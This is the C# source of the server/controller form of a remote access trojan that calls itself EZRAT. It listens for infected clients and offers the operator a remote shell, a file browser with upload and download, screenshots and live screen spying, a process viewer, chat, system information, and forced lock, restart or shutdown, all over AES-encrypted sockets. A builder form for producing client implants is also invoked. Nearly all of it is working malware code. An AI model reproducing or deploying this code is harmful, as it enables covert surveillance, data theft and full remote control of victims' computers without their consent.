﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using EZRATServer.Utils;
using EZRATServer.Forms;
using Timer = System.Windows.Forms.Timer;
using static EZRATServer.Utils.Constantes;


namespace EZRATServer
{
    public partial class Server : Form
    {

        private List<Socket> _clientSockets = new List<Socket>();
        private AutoResetEvent ConnectEvent = new AutoResetEvent(false);
        private ManualResetEvent TcpClientConnected = new ManualResetEvent(false);
        private Thread TConnect;
        private Thread scrnThread;
        public bool OnOffscreenSpy = false;
        public bool OnOffDlFile = false;
        private int _port = 0;
        private static Socket _serverSocket;
        private uint screenShotNumber = 0;
        public string fileNameDownload = string.Empty;
        FileBrowser fl;
        Chat cht;
        ProcessViewer pc;
        ShellCommand cmd;
        SystemDetails sys;
        ScreenShotViewer scrn;


        Timer tmr = new Timer();




        #region Variables
        private int FPS = 80;

        /// <summary>
        /// The text format received data
        /// </summary>
        private string text = string.Empty;
        /// <summary>
        /// The number of received bytes
        /// </summary>
        private int received;

        /// <summary>
        /// File transfer Mode Copy
        /// </summary>
        private const int xfer_copy = 1;
        /// <summary>
        /// File Transfer Mode Move
        /// </summary>
        private const int xfer_move = 2;


        /// <summary>
        /// Receive buffer size
        /// </summary>
        private const int _BUFFER_SIZE = 20971520;
        /// <summary>
        /// Port for the server to listen on
        /// </summary>
        private const int _PORT = 100; //port number
        /// <summary>
        /// Receive buffer
        /// </summary>
        private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
        /// <summary>
        /// Array of controlled clients
        /// </summary>
        private int controlClient = 0;
        /// <summary>
        /// Indicates if the remote cmd is active
        /// </summary>
        private static bool _isCmdStarted = false;
        private static string hostToken = "";


        /// <summary>
        /// File transfer from location
        /// </summary>
        private String xfer_path = "";
        /// <summary>
        /// File transfer mode
        /// </summary>
        private int xfer_mode = 0;

        /// <summary>
        /// Remote file editor content
        /// </summary>
        private String edit_content = "";
        /// <summary>
        /// Path of the file to upload
        /// </summary>
        private String fup_local_path = "";
        /// <summary>
        /// Size of the file to download
        /// </summary>
        private int fdl_size = 0;
        /// <summary>
        /// Indicates if file download is in progress
        /// </summary>
        private bool isFileDownload = false;
        /// <summary>
        /// Buffer for receiving files
        /// </summary>
        private byte[] recvFile = new byte[1];
        /// <summary>
        /// Number of bytes written to the downloaded file
        /// </summary>
        private int write_size = 0;
        /// <summary>
        /// The location of the downloaded file
        /// </summary>
        private String fdl_location = "";
        /// <summary>
        /// Indicates if the server (listener) is started
        /// </summary>
        private bool _isServerStarted = false;
        /// <summary>
        /// Distributes server start info to plugins
        /// </summary>
        private bool IsStartedServer { get { return _isServerStarted; } set { _isServerStarted = value; } }

        public List<Socket> ClientSockets { get => _clientSockets; }

        /// <summary>
        /// Indicates if clients need to get new IDs
        /// </summary>
        private bool reScanTarget = false;
        /// <summary>
        /// ID of the disconnected client
        /// </summary>
        private int reScanStart = -1;
        /// <summary>
        /// ID of the disconnected client
        /// </summary>
        private int killtarget = -1;
        /// <summary>
        /// Socket of the disconnected client
        /// </summary>
        private Socket killSocket;



        //public static double dx = 0;
        //public static double dy = 0;
        /// <summary>
        /// Indicates remote keyboard state
        /// </summary>
        public static int rkeyboard = 0;
        /// <summary>
        /// Indicates remote mouse state
        /// </summary>
        public static int rmouse = 0;
        /// <summary>
        /// Stores the previous X coordinate the mouse moved to
        /// </summary>
        public static int plx = 0;
        /// <summary>
        /// Stores the previous Y coordinate the mouse moved to
        /// </summary>
        public static int ply = 0;
        /// <summary>
        /// Indicates the screen resolution width
        /// </summary>
        public static int resx = 0;
        /// <summary>
        /// Indicates the screen resolution heigth
        /// </summary>
        public static int resy = 0;
        /// <summary>
        /// Indicates is the resolution data is set or not
        /// </summary>
        public static int resdataav = 0;

        /// <summary>
        /// List of routed windows
        /// </summary>
        public static List<Form> routeWindow = new List<Form>();
        /// <summary>
        /// List of every tool strip item on the main form
        /// </summary>
        public static List<ToolStripItem> tsitem = new List<ToolStripItem>();
        /// <summary>
        /// List of every tool strip item's name on the main form
        /// </summary>
        public static List<String> tsrefname = new List<String>();
        /// <summary>
        /// List of control values for routed Windows to pull values from
        /// </summary>
        public static List<String> getvalue = new List<String>();
        /// <summary>
        /// List of control values for the main form to pull values from
        /// </summary>
        public static List<String> setvalue = new List<String>();
        /// <summary>
        /// Route of remote desktop module
        /// </summary>
        public static String rdRouteUpdate = "route0.none";
        /// <summary>
        /// Route of webcam watcher module
        /// </summary>
        public static String wcRouteUpdate = "route0.none";
        /// <summary>
        /// Indicates if the form protects the listView from updateing values
        /// </summary>
        public static bool protectLv = false;
        //public static int rwriteLv = 0;
        //public static bool only1 = false;
        /// <summary>
        /// Selected TabPage
        /// </summary>
        public static TabPage selected = new TabPage();
        /// <summary>
        /// List of every TabPage
        /// </summary>
        private List<TabPage> pages = new List<TabPage>();
        /// <summary>
        /// Reference to the remote button to click
        /// </summary>
        public static Button rbutton = new Button();
        /// <summary>
        /// The focused tab page before the button click procedure
        /// </summary>
        public static TabPage setPagebackup = new TabPage();
        /// <summary>
        /// The set focus back operation phases
        /// </summary>
        public static int setFocusBack = 1;
        /// <summary>
        /// The route to give back the focus to
        /// </summary>
        public static int setFocusRouteID = -1;


        /// <summary>
        /// Startup folder of the client
        /// </summary>
        public String remStart = "";
        /// <summary>
        /// Remote mouse movement commands
        /// </summary>
        private List<string> rMoveCommands = new List<string>();
        /// <summary>
        /// Timer to execute mouse movement
        /// </summary>
        Timer rmoveTimer = new Timer();

#if EnableAutoLoad
        /// <summary>
        /// Indicates the progress of auto load function
        /// </summary>
        private int autoLoadProgress = 0;
#endif 

        /// <summary>
        /// Crypto exception handling flag
        /// </summary>
        private bool IsException = false; //switch
        /// <summary>
        /// Mouse movement control flag
        /// </summary>
        private bool mouseMovement = true; //switch

        /// <summary>
        /// ToolStrip item add/remove locking object
        /// </summary>
        private object TSLockObject = new object();
        #endregion



        public Server()
        {
            InitializeComponent();
            lstClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
            lstClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            this.btnStart.Click += StartServer;
            this.btnStop.Click += StopServer;
            this.btnBuild.Click += BuilderClient;
            this.btnSettings.Click += NotifiClients;
            this.FormClosing += CloseProgram;
            tmr.Tick += UpdateClient;
            this.imageContextMenu1.ItemClicked += RightClickSelect;
            (this.imageContextMenu1.Items[10] as ToolStripMenuItem).DropDownItemClicked += RightClickSelect;
            (this.imageContextMenu1.Items[9] as ToolStripMenuItem).DropDownItemClicked += RightClickSelect;
        }
        private void BuilderClient(object sende4r, EventArgs e)
        {
            ClientBuilder cb = new ClientBuilder();
            cb.Show();
        }


        public int GetIdClient()
        {
            int result = 0;
            if (this.lstClients.InvokeRequired)
                this.lstClients.Invoke(new Action(() => { result = this.lstClients.SelectedIndices[0]; }));
            else
                result = this.lstClients.SelectedIndices[0];
            return result;
        }
        void RightClickSelect(object sender, ToolStripItemClickedEventArgs e)
        {
            switch (e.ClickedItem.Text)
            {
                case "File Browser":
                    fl = new FileBrowser(this, GetIdClient());
                    fl.Show();
                    SendCommand("lsdrives", GetIdClient());
                    SendCommand("lsfiles", GetIdClient());
                    break;
                case "Chat":
                    cht = new Chat(this, GetIdClient());
                    SendCommand("chat;", GetIdClient());
                    cht.Show();
                    break;
                case "Process Viewer":
                    pc = new ProcessViewer(this, GetIdClient());
                    SendCommand("procview;", GetIdClient());
                    pc.Show();
                    break;
                case "ScreenShot":
                    SendCommand("scrnshot;", GetIdClient());
                    break;
                case "Shell":
                    cmd = new ShellCommand(this, "C:\\", GetIdClient());
                    cmd.Show();
                    break;
                case "System Info":
                    sys = new SystemDetails();
                    sys.Show();
                    SendCommand("sysinfo;", GetIdClient());
                    break;
                case "Lock":
                    SendCommand("control;0", GetIdClient());
                    break;
                case "Restart":
                    SendCommand("control;1", GetIdClient());
                    break;
                case "Shutdown":
                    SendCommand("control;2", GetIdClient());
                    break;
                case "MessageBox":
                    SendCommand("msgbox;" + new MessageBoxEditor().Dialog(), GetIdClient());
                    break;
                case "ScreenSpy":
                    SendCommand("screenspy;", GetIdClient());
                    break;
                case "Play Sound":
                    Thread tmp = new Thread(() => { UploadFile(SoundSearch()); });
                    tmp.SetApartmentState(ApartmentState.STA);
                    tmp.Start();
                    break;
                case "Close":
                    SendCommand("dc", GetIdClient());
                    this._clientSockets[GetIdClient()].Shutdown(SocketShutdown.Both);
                    this._clientSockets.RemoveAt(GetIdClient());
                    this.lstClients.Invoke(new MethodInvoker(() => this.lstClients.Items[GetIdClient()].Remove()));
                    break;
                default:
                    break;
            }
        }


        private string SoundSearch()
        {
            OpenFileDialog opf = new OpenFileDialog();
            opf.Multiselect = false;
            opf.Filter = "Wav files | *.wav";
            if (opf.ShowDialog() == DialogResult.OK)
            {
                return opf.FileName;
            }
            else
            {
                return null;
            }
        }

        void CloseProgram(object sender, EventArgs e)
        {
            StopServer(sender, e);
        }

        void NotifiClients(object sender, EventArgs e)
        {
            SendCommand("test", 0);
        }


        void UpdateClient(object sender, EventArgs e)
        {
            for (int i = 0; i < ClientSockets.Count; i++)
            {
                if (!ClientSockets[i].Connected)
                {
                    lstClients.Items[i].Remove();
                    ClientSockets.RemoveAt(i);
                }
            }
        }

        void StopServer(object sender, EventArgs e)
        {
            this.lblStatus.Text = "Server stoped";
            DisconnectSocketServer();
            CloseAllSockets();
        }

        void StartServer(object sender, EventArgs e)
        {
            Starting portDialog = new Starting();
            portDialog.ShowDialog();
            this._port = portDialog.Port;
            tmr.Interval = 500;
            SetupServer();
            tmr.Start();
            this.lblStatus.Text = $"Server listen port : {this._port}";
        }


        private void SetupServer()
        {
            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //Create the new server socket
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any, this._port)); //Bind the new socket to the local machine
            _serverSocket.Listen(5); //Listen for incoming connections
            _serverSocket.BeginAccept(AcceptCallback, null); //Define the client accept callback
            IsStartedServer = true;
        }

        private void DisconnectSocketServer()
        {
            if (_isServerStarted)
            {
                _serverSocket.Close();
                _serverSocket.Dispose();
            }
        }

        /// <summary>
        /// Kill all connected clients and close the server socket
        /// </summary>
        private void CloseAllSockets()
        {
            IsStartedServer = false; //Set the server started to false
            int id = 0; //Declare the index variable

            foreach (Socket socket in ClientSockets) //Go through each connected socket
            {
                try
                {
                    SendCommand("dc", id); //Send a graceful disconnect command
                    socket.Shutdown(SocketShutdown.Both); //Shutdown the sockets
                    socket.Close(); //Close the socket
                    socket.Dispose(); //Dispose the socket
                }
                catch (Exception) //If something went wrong
                {
                    Console.WriteLine("Client" + id + " failed to send dc request!"); //Debug Function
                }
                id++;
            }

            if (_isServerStarted)
            {
                _serverSocket.Close(); //Close the server socket
                _serverSocket.Dispose(); //Dispose the server socket

                ClientSockets.Clear(); //Remove all client sockets from the client list
            }

        }

        /// <summary>
        /// Handling clients trying to connect to the server
        /// </summary>
        /// <param name="AR">Async result for the function</param>
        private void AcceptCallback(IAsyncResult AR)
        {
            Socket socket; //Declare a new socket

            try
            {
                socket = _serverSocket.EndAccept(AR); //Try to get the connecting socket
            }
            catch (Exception) //Client closed the connection before accepting
            {
                Console.WriteLine("Accept callback error"); //Debug function
                return;
            }

            ClientSockets.Add(socket); //Add the new socket to the list
            int id = ClientSockets.Count - 1; //Get the new ID for the client
            string cmd = "getinfo-" + id.ToString(); //Construct the command
            SendCommand(cmd, id); //Send the command
            socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket); //Add the reading callback
            _serverSocket.BeginAccept(AcceptCallback, null); //Restart accepting clients

        }






        private int GetSocket(Socket socket)
        {
            int tracer = 0; //Declare index variable

            foreach (Socket s in ClientSockets) //Go through the connected sockets
            {
                if (s == socket) //If the sockets match
                {
                    return tracer; //Return the index of the socket
                }
                tracer++; //Increment the index
            }

            return -1; // Return a negative index, causing an exception
        }

        public string Encrypt(string clearText)
        {
            string EncryptionKey = EncryptKey; //Declare the encryption key (it's not the best thing to do)
            byte[] clearBytes = Encoding.Default.GetBytes(clearText); //Get the bytes of the message
            using (Aes encryptor = Aes.Create()) //Create a new aes object
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 }); //Get encryption key
                encryptor.Key = pdb.GetBytes(32); //Set the encryption key
                encryptor.IV = pdb.GetBytes(16); //Set the encryption IV

                using (MemoryStream ms = new MemoryStream()) //Create a new memory stream
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write)) //Create a new crypto stream
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length); //Write the command to the crypto stream
                        cs.Close(); //Close the crypto stream
                    }
                    clearText = System.Convert.ToBase64String(ms.ToArray()); //Convert the encrypted bytes to a Base64 string
                }
            }
            return clearText; //Return the encrypted command
        }



        public string Decrypt(string cipherText)
        {
            try //Try
            {
                string EncryptionKey = EncryptKey; //Declare the decryption key (not the best thing to do, same key as above)
                byte[] cipherBytes = System.Convert.FromBase64String(cipherText); //Decrypt base 64 to bytes
                using (Aes encryptor = Aes.Create()) //Create a new aes object
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 }); //Get encryption key
                    encryptor.Key = pdb.GetBytes(32); //Set the key
                    encryptor.IV = pdb.GetBytes(16); //Set the IV
                    using (MemoryStream ms = new MemoryStream()) //Create new memory stream
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write)) //Create new crypto stream
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length); //Write the encrypted data to the crypto stream
                            cs.Close(); //Close the crypto stream
                        }
                        cipherText = Encoding.Default.GetString(ms.ToArray()); //Convert the memory stream to string
                    }
                }

                return cipherText; //Return the decrypted text
            }
            catch (Exception) //Can't decrypt
            {
                //plain text?
                //  MessageBox.Show("Decrypt error "); //dont show the decrytp error it is too large and causes more problems
                //return  cipherText;
                //Set the exception flag
                IsException = true; //spirals out of control here if you cannot decrypt jibberish over bad connection so added this - seems to work
                return null; //Return null
            }
        }



        public void SendCommand(string command, int targetClient)
        {
            try
            {
                Socket s = ClientSockets[targetClient]; //Get the socket

                try
                {
                    command = Encrypt(command); //Encrypt the comand
                    byte[] data = Encoding.Default.GetBytes(command); //Get the unicode bytes of the comand
                    string header = command.Length.ToString() + "§"; //Create message length header
                    byte[] byteHeader = Encoding.Default.GetBytes(header); //Convert the header to bytes
                    byte[] fullBytes = new byte[byteHeader.Length + data.Length]; //Allocate space for the full message
                    Array.Copy(byteHeader, fullBytes, byteHeader.Length); //Copy the message hader to the full message
                    Array.ConstrainedCopy(data, 0, fullBytes, byteHeader.Length, data.Length); //Copy the message to the full message
                    s.Send(fullBytes); //Send the full message
                }
                catch (Exception) //Something went wrong
                {
                    int id = targetClient; //Store the id of the target client
                    reScanTarget = true; //Set rescan flag to true
                    reScanStart = id; //Set the rescan target
                    Console.WriteLine("Client forcefully disconnected"); //Debug Function
                    s.Close(); //Close the target socket
                    ClientSockets.Remove(s); //Remove the socket from the list
                    RestartServer(id); //Restart the server
                    return; //Return
                }

            }
            catch
            {
                //Do nothing
            }
        }


        private void RestartServer(int id)
        {
            if (lstClients.Items.Count > 0)
            {
                this.lstClients.Invoke(new MethodInvoker(() => this.lstClients.Items[id].Remove()));
            }
            MessageBox.Show($"Client disconnect : {id}");
        }




        private void ReceiveCallback(IAsyncResult AR)
        {
            Socket current = (Socket)AR.AsyncState; //Get the communicating client's socket

            bool dclient = false; //Declare client disconnection variable

            if (!IsStartedServer) return; //Return if the server is not started

            try
            {
                if (!IsException) //If no exceptions
                {
                    received = current.EndReceive(AR); //Get the number of recevied bytes
                }
                else //If exception then
                {
                    received = current.EndReceive(AR); //Get the jibberish
                    received = 0; //Reset it back to 0
                    IsException = false; //Disable the exception flag
                }

            }
            catch (Exception) //If something went wrong
            {
                int id = GetSocket(current); //get the id of the client
                reScanTarget = true; //Set the rescan flag
                reScanStart = id; //Set the starting ID for rescan
                //Console.WriteLine("Client forcefully disconnected");
                current.Close(); //Close the communicating socket
                ClientSockets.Remove(current); //Remove the socket from the clients list
                RestartServer(id); //Restart the server to rename every client
                return; //Return
            }


            if (received > 0) // Check if we have any data
            {
                byte[] recBuf = new byte[received]; //Declare a new received buffer with the size of the received bytes
                Array.Copy(_buffer, recBuf, received); //Copy from the big array to the new array, with the size of the received bytes
                bool ignoreFlag = false; //Declare the ignore flag


                if (OnOffDlFile)
                {
                    string path = Environment.CurrentDirectory;
                    int size = 1024;
                    long sizeFile = 0, tot = 0;
                    if (!Directory.Exists($"{path}\\Files"))
                    {
                        Directory.CreateDirectory($"{path}\\Files");
                    }
                    FileStream fs = new FileStream($"{path}\\Files\\{fileNameDownload}", FileMode.Create);
                    NetworkStream ns = new NetworkStream(this.ClientSockets[GetIdClient()]);
                    fs.Write(recBuf, 0, size);
                    try
                    {
                        byte[] data = new byte[size];
                        bool loop_break = true;
                        ns.ReadTimeout = 500;
                        do
                        {
                            int nb = ns.Read(data, 0, size);
                            fs.Write(data, 0, nb);
                            fs.Flush();
                            tot += (uint)nb;
                            if (nb == -1)
                            {
                                loop_break = false;
                            }
                        } while (loop_break);
                    }
                    catch (IOException ex)
                    {
                        MessageBox.Show("File download", $"File : {fileNameDownload} is downloaded", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        fs.Close();
                        ns.Close();
                    }

                    OnOffDlFile = false;
                    goto ENDFUNC;
                }


                try //Try
                {
                    text = Encoding.Default.GetString(recBuf); //Get the text from the receive buffer
                    text = Decrypt(text); //Decrypt the received text
                }
                catch (Exception ex) //Something went wrong
                {
                    MessageBox.Show("Original Error :: " + ex.Message); //Display the error message
                }

                if (text != null && this._clientSockets.Count > 0) //If text is not null
                {
                    if (text.StartsWith("infoback;")) //Info received from client
                    {
                        string[] mainContainer = text.Split(';'); // Get the main data parts
                        int id = int.Parse(mainContainer[1]); //The client ID
                        string[] lines = mainContainer[2].Split(SeparatorChar); //Split the data into parts
                        string ip = lines[0] + $" : {((IPEndPoint)ClientSockets[id].RemoteEndPoint).Port}"; //The computer's local IPv4 address
                        string name = lines[1]; //The Computer Name
                        string user = lines[2].Substring(lines[2].LastIndexOf('\\') + 1); //The computer's date and time
                        string windows = lines[3]; //The computer's installed Anti Virus product
                        string version = lines[4];

                        AddToData(new ClientData(id, ip, name, user, windows, version)); //Update the UI
                    }
                    else if (text.StartsWith("lsdrives;"))
                    {
                        string[] mainContainer = text.Split(';'); // Get the main data parts
                        string[] lines = mainContainer[1].Split(SeparatorChar); //Split the data into parts
                        fl.UpdateDrives(lines);
                    }
                    else if (text.StartsWith("lsfiles;"))
                    {
                        string[] mainContainer = text.Split(';'); // Get the main data parts
                        string path = mainContainer[1];
                        string lines = mainContainer[2]; //Split the data into parts
                        fl.Update(lines);
                    }
                    else if (text.StartsWith("chat;"))
                    {
                        string msg = text.Substring(5);
                        cht.NewMessage(msg);
                    }
                    else if (text.StartsWith("chatdata;"))
                    {
                        string msg = text.Substring(9);
                        string[] result = msg.Split(SeparatorChar);
                        cht.UpdateAllData(result);
                    }
                    else if (text.StartsWith("dlfile;"))
                    {
                        text = text.Substring(7);
                        string path = Environment.CurrentDirectory;
                        this.fl.Invoke(new MethodInvoker(() => path += "\\Files" + this.fl.PathDownload.Substring(this.fl.PathDownload.LastIndexOf('\\'))));
                        ReceiveFile(text, path);
                    }
                    else if (text.StartsWith("procview;"))
                    {
                        text = text.Substring(9);
                        string[] res = text.Split(';');
                        pc.UpdateData(res);
                    }
                    else if (text.StartsWith("scrnshot;"))
                    {
                        text = text.Substring(9);
                        byte[] img = Encoding.Default.GetBytes(text);
                        Bitmap bp;
                        using (MemoryStream ms = new MemoryStream(img))
                        {
                            bp = new Bitmap(ms);
                        }
                        SaveScreenShot(bp);

                    }
                    else if (text.StartsWith("cmd;"))
                    {
                        text = text.Substring(4);
                        string[] lines = text.Split(';');
                        cmd.Path = lines[0];
                        cmd.AddResultLine(lines[1]);
                    }
                    else if (text.StartsWith("sysinfo;"))
                    {
                        text = text.Substring(8);
                        string[] lines = text.Split(SeparatorChar);
                        sys.Invoke(new MethodInvoker(() => { sys.UpdateData(lines); }));

                    }
                    else if (text.StartsWith("screenspy;"))
                    {
                        text = text.Substring(10);
                        byte[] img = Encoding.Default.GetBytes(text);
                        ShowScreenShot(StreamToImage(img));
                    }
                    else if (text.StartsWith("upfilestop;"))
                    {
                        MessageBox.Show("Upload file", "File uploaded finish", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }


                }

            ENDFUNC:

                if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current); //If client is not disconnecting, restart the reading
            }
        }


        private void UploadFile(string path)
        {
            try
            {
                //this._parent.SendFile(path,this.Path); //Send the data to the server
                string fileName = System.IO.Path.GetFileName(path);

                //File.ReadAllBytes(path).ToList().ForEach((b) => { dataFile += b.ToString() + Constantes.Separator; });
                //string result = _parent.Encrypt("upfile;" + dataFile);                    //string result = _parent.Encrypt("upfile;" + dataFile);
                this.SendCommand("upfile;", this.GetIdClient()); // + this.Path + new NameUpload(opf.FileName).Dialog()  + ";" + dataFile, this.BaseWindows.GetIdClient());
                SendFile(path);

            }
            catch (Exception ex) //Failed to send data to the server
            {
                Console.WriteLine("Send File Failure " + ex.Message);
                return; //Return
            }
        }

        private void SendFile(string path)
        {
            string file_name = System.IO.Path.GetFileName(path);
            int size = 1024;
            uint tot = 0;
            FileStream fs = new FileStream(path, FileMode.Open);
            NetworkStream ns = new NetworkStream(this.ClientSockets[this.GetIdClient()]);
            byte[] data = new byte[size];
            while (tot < fs.Length)
            {
                fs.Read(data, 0, size);
                tot += (uint)data.Length;
                ns.Write(data, 0, size);
            }
            Console.WriteLine($"Total data : {tot}");
            fs.Close();
        }

        public void ShowScreenShot(Image img)
        {
            if (scrn == null || OnOffscreenSpy == false)
            {
                scrnThread = new Thread(() =>
                {
                    scrn = new ScreenShotViewer(img, this);
                    scrn.ShowDialog();
                });
                scrnThread.Start();
                OnOffscreenSpy = true;
            }
            else
            {
                scrn.Img = img;
            }
        }

        private Image StreamToImage(byte[] img)
        {
            Bitmap result;
            using (MemoryStream ms = new MemoryStream(img))
            {
                result = new Bitmap(ms);
            }
            return result;
        }
        private void SaveScreenShot(Image img)
        {
            string dir = Environment.CurrentDirectory + @"\ScreenShot\";
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
            img.Save(dir + $@"ScreenShot_{screenShotNumber += 1}.png");
        }


        public void SendFile(string path, string pathUploaded)
        {
            if (!ClientSockets[GetIdClient()].Connected) //If the client isn't connected
            {
                Console.WriteLine("Socket is not connected!");
                return; //Return
            }
            try
            {
                string data = Encrypt("upfile;" + pathUploaded + path.Substring(path.LastIndexOf('\\') + 1) + ";" + File.ReadAllText(path));
                string header = data.Length.ToString() + "§";
                byte[] result = Encoding.Default.GetBytes(header + data);
                ClientSockets[GetIdClient()].Send(result);
            }
            catch (Exception ex) //Failed to send data to the server
            {
                Console.WriteLine("Send File Failure " + ex.Message);
                return; //Return
            }
        }


        private void ReceiveFile(string data, string path)
        {

            string[] textValue = data.Split(SeparatorChar);
            byte[] fileData = new byte[textValue.Length];
            for (int i = 0; i < textValue.Length - 1; i++)
            {
                fileData[i] = Convert.ToByte(textValue[i]);
            }
            string dir = path.Substring(0, path.LastIndexOf('\\'));
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }
            File.WriteAllBytes(path, fileData);

        }



        // lstIP, lstName, lstUser, lstWindows
        void AddToData(ClientData data)
        {
            if (!lstClients.InvokeRequired)
            {
                this.lstClients.Items.Add(new ListViewItem(new string[] { data.Id.ToString(), data.Ip, data.Name, data.User, data.Windows, data.Version }));
            }
            else
            {
                lstClients.Invoke(new MethodInvoker(() =>
                {
                    lstClients.Items.Add(new ListViewItem(new string[] { data.Id.ToString(), data.Ip, data.Name, data.User, data.Windows, data.Version }));
                    lstClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
                    lstClients.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                }));
            }


        }

        void UpdateDataClient(ClientData data)
        {
            this.dgvClients.Rows[data.Id].SetValues(data.Ip, data.Name, data.User, data.Windows, data.Version);
        }
    }
}
